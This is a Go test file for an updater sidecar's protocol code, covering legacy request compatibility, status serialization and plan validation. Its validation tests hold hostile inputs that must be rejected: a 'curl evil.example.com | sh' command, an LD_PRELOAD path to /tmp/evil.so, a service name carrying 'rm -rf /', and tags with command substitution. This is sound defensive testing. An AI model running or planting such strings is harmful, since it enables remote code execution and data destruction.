package protocol

import (
	"encoding/json"
	"reflect"
	"sort"
	"strings"
	"testing"
)

// legacyUpdateRequest is the protocol 2 request body, reproduced verbatim. It stands
// in for an updater sidecar that has not been refreshed yet.
type legacyUpdateRequest struct {
	Service string `json:"service"`
	Image   string `json:"image"`
	Tag     string `json:"tag"`
	Version string `json:"version"`
	Commit  string `json:"commit"`
	Channel string `json:"channel"`
}

// TestNewUpdaterAcceptsLegacyRequest covers an application that predates plans
// talking to a refreshed sidecar. This happens on every deployment where the
// updater self-refreshes before the application container is replaced.
func TestNewUpdaterAcceptsLegacyRequest(t *testing.T) {
	body := `{
		"service": "cli-proxy-api",
		"image": "ghcr.io/kittors/clirelay",
		"tag": "dev",
		"version": "dev-abc1234",
		"commit": "abc1234",
		"channel": "dev"
	}`

	var req UpdateRequest
	if err := json.Unmarshal([]byte(body), &req); err != nil {
		t.Fatalf("decode legacy request: %v", err)
	}
	if req.Plan != nil {
		t.Fatalf("legacy request should not carry a plan, got %+v", req.Plan)
	}
	if req.Service != "cli-proxy-api" || req.Image != "ghcr.io/kittors/clirelay" || req.Tag != "dev" {
		t.Fatalf("legacy flat fields lost: %+v", req)
	}
}

// TestLegacyUpdaterAcceptsPlanRequest covers the reverse: a plan-aware application
// posting to a sidecar that only understands the flat form. The nested plan must be
// ignorable without losing the information the old updater needs to act.
func TestLegacyUpdaterAcceptsPlanRequest(t *testing.T) {
	req := UpdateRequest{
		Plan: &Plan{
			PlanVersion: 1,
			Image:       "ghcr.io/kittors/clirelay",
			Tag:         "dev",
			Stages:      []Stage{{ID: "app", Services: []string{"cli-proxy-api"}}},
		},
		Service: "cli-proxy-api",
		Image:   "ghcr.io/kittors/clirelay",
		Tag:     "dev",
		Version: "dev-abc1234",
	}

	encoded, err := json.Marshal(req)
	if err != nil {
		t.Fatalf("encode plan request: %v", err)
	}

	var legacy legacyUpdateRequest
	if err := json.Unmarshal(encoded, &legacy); err != nil {
		t.Fatalf("legacy updater failed to decode plan request: %v", err)
	}
	if legacy.Service != "cli-proxy-api" || legacy.Image != "ghcr.io/kittors/clirelay" || legacy.Tag != "dev" {
		t.Fatalf("plan request is not readable by a legacy updater: %+v", legacy)
	}
}

// TestStatusAlwaysReportsNumericProgress pins the omitempty fix. A zero percent must
// survive serialization, otherwise the panel cannot distinguish "0% done" from "no
// progress reporting" and renders a full bar at the start of every update.
func TestStatusAlwaysReportsNumericProgress(t *testing.T) {
	encoded, err := json.Marshal(Status{Status: StatusRunning, Stage: StagePulling})
	if err != nil {
		t.Fatalf("encode status: %v", err)
	}

	var decoded map[string]any
	if err := json.Unmarshal(encoded, &decoded); err != nil {
		t.Fatalf("decode status: %v", err)
	}
	for _, field := range []string{
		"progress_percent",
		"progress_current",
		"progress_total",
		"progress_bytes",
		"progress_total_bytes",
	} {
		if _, ok := decoded[field]; !ok {
			t.Fatalf("%s must be emitted even when zero; got %s", field, encoded)
		}
	}
}

// TestStatusWireFieldsAreFrozen fails when a field is removed or renamed. Adding a
// field is fine and only requires extending this list.
func TestStatusWireFieldsAreFrozen(t *testing.T) {
	frozen := []string{
		"current_commit", "current_ui_commit", "current_ui_version", "current_version",
		"event_id", "finished_at", "logs", "message", "message_code",
		"progress_bytes", "progress_current", "progress_percent", "progress_total",
		"progress_total_bytes", "progress_unit",
		"release_name", "release_notes", "release_published_at", "release_tag", "release_url",
		"run_id", "service", "stage", "stages", "started_at", "status",
		"target_channel", "target_commit", "target_commit_url", "target_image", "target_tag",
		"target_ui_commit", "target_ui_commit_url", "target_ui_version", "target_version",
		"updated_at",
	}

	present := jsonFieldNames(reflect.TypeOf(Status{}))
	for _, field := range frozen {
		if _, ok := present[field]; !ok {
			t.Errorf("frozen status field %q disappeared from the wire contract", field)
		}
	}
}

// jsonFieldNames reads the json tags off the struct type rather than off a marshaled
// instance. Inspecting an instance would let omitempty hide any field that happened
// to be unset, which defeats the point of pinning the contract.
func jsonFieldNames(structType reflect.Type) map[string]struct{} {
	names := make(map[string]struct{}, structType.NumField())
	for index := range structType.NumField() {
		tag := structType.Field(index).Tag.Get("json")
		if tag == "" || tag == "-" {
			continue
		}
		name, _, _ := strings.Cut(tag, ",")
		if name != "" {
			names[name] = struct{}{}
		}
	}
	return names
}

func TestPlanValidateRejectsUnsupportedVersion(t *testing.T) {
	_, err := (&Plan{PlanVersion: MaxPlanVersion + 1, Image: "img", Tag: "t"}).Validate()
	if err == nil {
		t.Fatal("expected an unsupported plan version to be rejected")
	}
	if !strings.Contains(err.Error(), "recreate the clirelay-updater") {
		t.Errorf("error should tell the operator how to recover, got %q", err)
	}
}

// TestPlanValidateRejectsArbitraryPrepareCommand guards the security boundary: the
// updater holds the Docker socket, so a plan must not be able to name the command
// that runs inside a privileged container.
func TestPlanValidateRejectsArbitraryPrepareCommand(t *testing.T) {
	for _, command := range [][]string{
		{"sh", "-c", "curl evil.example.com | sh"},
		{"/bin/bash"},
		{"clirelay-init-env", "--extra"},
	} {
		plan := &Plan{
			PlanVersion: 1,
			Image:       "ghcr.io/kittors/clirelay",
			Tag:         "dev",
			Prepare:     &PrepareStep{Command: command},
			Stages:      []Stage{{ID: "app", Services: []string{"app"}}},
		}
		if _, err := plan.Validate(); err == nil {
			t.Errorf("prepare command %v should have been rejected", command)
		}
	}
}

func TestPlanValidateRejectsForeignPrepareEnv(t *testing.T) {
	plan := &Plan{
		PlanVersion: 1,
		Image:       "ghcr.io/kittors/clirelay",
		Tag:         "dev",
		Prepare: &PrepareStep{
			Command: []string{"clirelay-init-env"},
			Env:     map[string]string{"LD_PRELOAD": "/tmp/evil.so"},
		},
		Stages: []Stage{{ID: "app", Services: []string{"app"}}},
	}
	if _, err := plan.Validate(); err == nil {
		t.Fatal("prepare env outside the CLIRELAY_ namespace should be rejected")
	}
}

func TestPlanValidateRejectsInjectableServiceNames(t *testing.T) {
	plan := &Plan{
		PlanVersion: 1,
		Image:       "ghcr.io/kittors/clirelay",
		Tag:         "dev",
		Stages:      []Stage{{ID: "app", Services: []string{"app; rm -rf /"}}},
	}
	if _, err := plan.Validate(); err == nil {
		t.Fatal("a service name containing shell metacharacters should be rejected")
	}
}

func TestPlanValidateNormalizesWeightsAndPreservesOrder(t *testing.T) {
	plan := &Plan{
		PlanVersion: 1,
		Image:       "ghcr.io/kittors/clirelay",
		Tag:         "dev",
		Pull:        []string{" cli-proxy-api "},
		Stages: []Stage{
			{ID: "deps", Services: []string{"postgres", "redis"}, Optional: true},
			{ID: "app", Services: []string{"cli-proxy-api"}, Weight: 3, WaitHealthy: true},
		},
	}

	normalized, err := plan.Validate()
	if err != nil {
		t.Fatalf("validate: %v", err)
	}
	if got := normalized.Pull; len(got) != 1 || got[0] != "cli-proxy-api" {
		t.Fatalf("pull list not normalized: %v", got)
	}
	if normalized.Stages[0].Weight != 1 {
		t.Errorf("unset weight should default to 1, got %d", normalized.Stages[0].Weight)
	}
	if normalized.Stages[1].Weight != 3 {
		t.Errorf("explicit weight lost, got %d", normalized.Stages[1].Weight)
	}
	if normalized.TotalWeight() != 4 {
		t.Errorf("total weight = %d, want 4", normalized.TotalWeight())
	}
	if normalized.Stages[0].ID != "deps" || normalized.Stages[1].ID != "app" {
		t.Error("stage order must be preserved; it defines execution order")
	}
}

func TestImageRefRejectsUnsafeParts(t *testing.T) {
	for _, testCase := range []struct{ image, tag string }{
		{"ghcr.io/kittors/clirelay", "dev`whoami`"},
		{"ghcr.io/kittors/clirelay", "$(id)"},
		{"ghcr.io/kittors/clirelay", ""},
		{"", "dev"},
	} {
		if got := ImageRef(testCase.image, testCase.tag); got != "" {
			t.Errorf("ImageRef(%q, %q) = %q, want \"\"", testCase.image, testCase.tag, got)
		}
	}
}

func TestImageRepositoryStripsTagAndDigest(t *testing.T) {
	cases := map[string]string{
		"ghcr.io/kittors/clirelay:dev":      "ghcr.io/kittors/clirelay",
		"ghcr.io/kittors/clirelay@sha256:a": "ghcr.io/kittors/clirelay",
		"localhost:5000/app:tag":            "localhost:5000/app",
		"localhost:5000/app":                "localhost:5000/app",
	}
	keys := make([]string, 0, len(cases))
	for key := range cases {
		keys = append(keys, key)
	}
	sort.Strings(keys)
	for _, ref := range keys {
		if got := ImageRepository(ref); got != cases[ref] {
			t.Errorf("ImageRepository(%q) = %q, want %q", ref, got, cases[ref])
		}
	}
}
